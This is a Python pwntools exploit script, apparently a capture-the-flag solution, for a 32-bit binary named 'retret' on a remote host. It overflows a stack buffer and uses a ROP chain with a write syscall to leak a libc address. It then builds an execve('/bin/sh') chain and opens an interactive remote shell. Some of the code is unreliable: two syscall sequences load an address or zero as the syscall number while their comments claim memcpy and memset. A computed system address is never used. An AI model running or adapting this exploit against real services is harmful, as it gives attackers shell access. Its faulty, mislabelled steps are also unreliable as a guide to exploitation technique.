from pwn import *

e = ELF('./retret')
libc = ELF('./libc.so.6')

# gadget list
pop_eax_ecx = 0x08049099  # pop eax; pop ecx; ret (CRITICAL)
pop_ebx = 0x0804901e      # pop ebx; ret
pop_ecx = 0x0804909a      # pop ecx; ret
pop_edx = 0x080490f6      # pop edx; ret
int_0x80 = 0x080490a7     # int 0x80
ret = 0x08049022          # Stack alignment
addr__libc_start_main = 0x804c014
addr_main = 0x80491d5

p = remote("10.20.12.187", 4005)

# 1. Get libc func addr.
payload1 = b'A' * 0x1004
payload1 += p32(pop_eax_ecx) + p32(4) + p32(addr__libc_start_main) + p32(pop_ebx) + p32(1)
payload1 += p32(pop_edx) + p32(4) + p32(int_0x80) + p32(addr_main)

# print("1st payload: ", payload1)
p.sendline(payload1)
leak = u32(p.recv(4))
print("leak: ", hex(leak))
libc_base = leak - 0x1aa50
success(f"Libc base: {hex(libc_base)}")

# 2. call /bin/sh
system_addr = libc_base + 0x3eda0
binsh_addr = libc_base + 0x17eabb
argv_addr = e.bss() + 0x800

payload2 = b'A' * 0x1004
payload2 += p32(pop_eax_ecx) + p32(binsh_addr) + p32(argv_addr) + p32(pop_edx) + p32(4) + p32(int_0x80) # memcpy(argv_addr, &binsh_addr, 4)
payload2 += p32(pop_eax_ecx) + p32(0) + p32(argv_addr + 4) + p32(pop_edx) + p32(4) + p32(int_0x80) # memset(argv_addr + 4, 0, 4)
payload2 += p32(pop_eax_ecx) + p32(11) + p32(argv_addr) + p32(pop_ebx) + p32(binsh_addr) + p32(pop_edx) + p32(0) + p32(int_0x80) # execve(bin_sh_addr, argv_addr, null)

# print("2nd payload: ", hex(payload))

p.sendline(payload2)
print()
p.interactive()